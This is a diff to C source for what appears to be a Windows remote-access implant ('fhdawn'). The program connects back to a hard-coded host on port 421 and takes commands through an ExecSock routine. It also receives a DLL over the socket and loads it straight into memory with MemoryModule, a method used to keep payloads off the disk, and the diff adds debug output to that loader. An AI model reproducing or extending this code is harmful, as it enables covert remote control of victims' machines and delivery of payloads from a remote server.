@@ -9,6 +9,7 @@ Modified: -
 #include "MemoryModule.h"
 
 int fsize = 0;
+int result = -1;
 char* fileinfo[2];
 HMEMORYMODULE handle = NULL;
 
@@ -126,7 +127,8 @@ void fhdawn_main(void)
             }
             split(recvbuf, fileinfo, ":");
             int expected = atoi(fileinfo[1]);
-            unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
+            //unsigned char* DLL = HeapAlloc(GetProcessHeap(), 0, expected + 1);
+            unsigned char* DLL = malloc(expected + 1);
             memset(recvbuf, '\0', BUFFER);
             int total = 0;
             do {
@@ -135,15 +137,22 @@ void fhdawn_main(void)
                 total += fsize;
             } while (total != expected);
 
+            sockprintf(sockfd, "Got DLL of size %i bytes.\n", total);
             handle = MemoryLoadLibrary(DLL, expected);
             if (handle == NULL)
             {
                 sockprintf(sockfd,"Can't load library from memory.\n");
             }
-            else {
-                sockprintf(sockfd, "DLL Loaded in memory.\n");
-            }
-
+            
+            // result = MemoryCallEntryPoint(handle);
+            // if (result < 0) {
+            //     sockprintf(sockfd,"Could not execute entry point: %d\n", result);
+            // }
+            // else {
+            //     sockprintf(sockfd, "Executed in memory.\n");
+            // }
+            MemoryFreeLibrary(handle);
+            free(DLL);
         }
         else {
             ExecSock();
@@ -171,15 +180,16 @@ void StartWSA(void)
 void MainConnect(void)
 {
     StartWSA();
-    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, 0);
+    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if(sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
     {
         printf("Socket Creation Error. ");
+
         WSAReportError();
         exit(1);
     }
 
-    server.sin_addr.s_addr = inet_addr("127.0.0.1");
+    server.sin_addr.s_addr = inet_addr("192.168.0.104");
     server.sin_port = htons(421);
     server.sin_family = AF_INET;
 
